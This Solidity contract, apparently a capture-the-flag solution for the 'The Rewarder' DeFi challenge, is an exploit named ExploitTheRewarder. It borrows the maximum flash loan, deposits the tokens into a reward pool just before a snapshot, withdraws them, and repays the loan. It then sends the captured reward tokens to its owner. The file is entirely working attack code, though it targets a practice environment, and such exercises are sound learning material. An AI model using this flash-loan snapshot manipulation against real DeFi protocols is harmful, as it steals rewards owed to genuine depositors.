// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

contract ExploitTheRewarder {
  address private immutable owner;
  FlashLoanerPool private immutable flashLoanerPool;
  IERC20 private immutable liquidityToken;
  TheRewarderPool private immutable rewarderPool;

  constructor(address _flashLoanerPool, address _liquidityToken, address _rewarderPool) {
    owner = msg.sender;
    flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
    liquidityToken = IERC20(_liquidityToken);
    rewarderPool = TheRewarderPool(_rewarderPool);
  }

  function hackIt() external {
    //take maximal possible flash loan
    flashLoanerPool.flashLoan(liquidityToken.balanceOf(address(flashLoanerPool)));
  }

  function receiveFlashLoan(uint256 amount) external {
    require(msg.sender == address(flashLoanerPool), "Could be called only from pool");
    require(liquidityToken.balanceOf(address(this)) == amount, "Contract dont have liquidity to deposit");
    //approve spending
    liquidityToken.approve(address(rewarderPool), amount);
    // deposit tokens before snapshot
    rewarderPool.deposit(amount);
    // withdraw tokens
    rewarderPool.withdraw(amount);
    //repay flash loan
    SafeTransferLib.safeTransfer(address(liquidityToken), address(flashLoanerPool), amount);
  }

  function claimRewards(address rewardToken) external {
    IERC20 rewardTokenContract = IERC20(rewardToken);
    rewardTokenContract.transfer(owner, rewardTokenContract.balanceOf(address(this)));
  }
}
